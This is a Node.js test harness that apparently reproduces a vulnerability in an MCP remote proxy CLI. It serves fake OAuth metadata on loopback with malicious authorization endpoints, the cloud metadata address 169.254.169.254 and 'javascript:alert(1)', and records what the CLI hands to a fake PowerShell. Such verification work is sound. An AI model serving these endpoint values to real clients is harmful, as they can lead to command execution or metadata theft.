import {spawn} from 'node:child_process';
import {createServer} from 'node:http';
import {mkdirSync,mkdtempSync,readFileSync,writeFileSync,existsSync} from 'node:fs';
import {resolve,dirname,join} from 'node:path';
import {fileURLToPath} from 'node:url';
const required=(name)=>{const value=process.env[name];if(!value)throw Error(`Missing ${name}`);return resolve(value);};
const root=required('MCP_CASE_ROOT');
const runtime=required('MCP_RUNTIME_ROOT');
const node=process.env.MCP_NODE_BINARY?resolve(process.env.MCP_NODE_BINARY):process.execPath;
const fakeRoot=required('MCP_FAKE_SYSTEMROOT');
if(process.platform!=='win32')throw Error('F08 fake PowerShell recorder procedure requires Windows');
if(!existsSync(join(fakeRoot,'System32','WindowsPowerShell','v1.0','powershell.exe')))throw Error('Compile the recorder source into MCP_FAKE_SYSTEMROOT first');
mkdirSync(join(root,'runs'),{recursive:true});mkdirSync(join(root,'test-state'),{recursive:true});
const listen=s=>new Promise((ok,no)=>{s.once('error',no);s.listen(0,'127.0.0.1',()=>ok(`http://127.0.0.1:${s.address().port}`))});
const reply=(s,body)=>{s.writeHead(200,{'Content-Type':'application/json'});s.end(JSON.stringify(body))};
async function once(v,mode){let resourceOrigin,asOrigin;const requests=[],recordFile=join(root,'runs',`F08-CLI-${v}-${mode}.argv.txt`),state=mkdtempSync(join(root,'test-state',`${v}-${mode}-`));
 const resource=createServer((q,s)=>{requests.push({role:'resource',method:q.method,path:q.url});if(q.url==='/mcp'){s.writeHead(401,{'WWW-Authenticate':`Bearer resource_metadata="${asOrigin}/prm"`}).end();return}s.writeHead(404).end()});
 const as=createServer((q,s)=>{requests.push({role:'as',method:q.method,path:q.url});if(q.url==='/prm'){reply(s,{resource:resourceOrigin+'/mcp',authorization_servers:[asOrigin]});return}if(q.url?.startsWith('/.well-known/')){reply(s,{issuer:asOrigin,authorization_endpoint:mode==='link-local'?'http://169.254.169.254/latest/meta-data':mode==='script'?'javascript:alert(1)':asOrigin+'/authorize',token_endpoint:asOrigin+'/token',response_types_supported:['code'],grant_types_supported:['authorization_code']});return}s.writeHead(404).end()});
 resourceOrigin=await listen(resource);asOrigin=await listen(as);const env={PATH:dirname(node)+';'+(process.env.PATH??''),SYSTEMROOT:process.env.SYSTEMROOT??process.env.SystemRoot,USERPROFILE:state,TEMP:state,TMP:state,APPDATA:state,MCP_REMOTE_CONFIG_DIR:state,MCP_FAKE_SYSTEMROOT:fakeRoot,MCP_RECORDER_OUTPUT:recordFile,NODE_OPTIONS:`--require ${fileURLToPath(new URL('./f08-preload.cjs',import.meta.url))}`};
 const cli=join(runtime,v,'dist','proxy.js');const child=spawn(node,[cli,resourceOrigin+'/mcp','--transport','http-only','--static-oauth-client-info',JSON.stringify({client_id:'synthetic-browser-client'})],{cwd:root,env,windowsHide:true,stdio:['pipe','pipe','pipe']});let stdout='',stderr='';child.stdout.on('data',d=>stdout+=d);child.stderr.on('data',d=>stderr+=d);let exited=false;const closed=new Promise(ok=>child.once('close',(code,signal)=>{exited=true;ok({code,signal})}));child.stdin.write(JSON.stringify({jsonrpc:'2.0',id:1,method:'initialize',params:{protocolVersion:'2025-11-25',capabilities:{},clientInfo:{name:'synthetic',version:'1'}}})+'\n');
 const deadline=Date.now()+10000;while(Date.now()<deadline&&!existsSync(recordFile)&&!exited)await new Promise(ok=>setTimeout(ok,50));const record=existsSync(recordFile)?readFileSync(recordFile,'utf8'):null;child.kill();const stop=await Promise.race([closed,new Promise(ok=>setTimeout(()=>ok({timeout:true}),1500))]);for(const s of [resource,as]){s.closeAllConnections();await new Promise(ok=>s.close(ok))}
 const lines=record?.split(/\r?\n/)??[],index=lines.indexOf('-EncodedCommand'),decoded=index>=0&&lines[index+1]?Buffer.from(lines[index+1],'base64').toString('utf16le'):null;return {version:v,mode,cli,resourceOrigin,asOrigin,requests,recorded:record!==null,decoded,stop,stderr_tail:stderr.slice(-2500),stdout_tail:stdout.slice(-1000)}
}
const results=[];for(const v of ['0.15.2','0.16.0'])for(const mode of ['loopback','link-local','script'])results.push(await once(v,mode));writeFileSync(join(root,'runs','F08-CLI-RESULTS.json'),JSON.stringify({node:process.version,scope:'Full unmodified published CLI, local MCP/PRM/AS metadata, synthetic client and fake PowerShell recorder via test-only preload environment; no browser or internal network request.',results},null,2)+'\n');for(const x of results)console.log(JSON.stringify({version:x.version,mode:x.mode,recorded:x.recorded,decoded:x.decoded,requests:x.requests,error:x.stderr_tail.slice(-450)}));
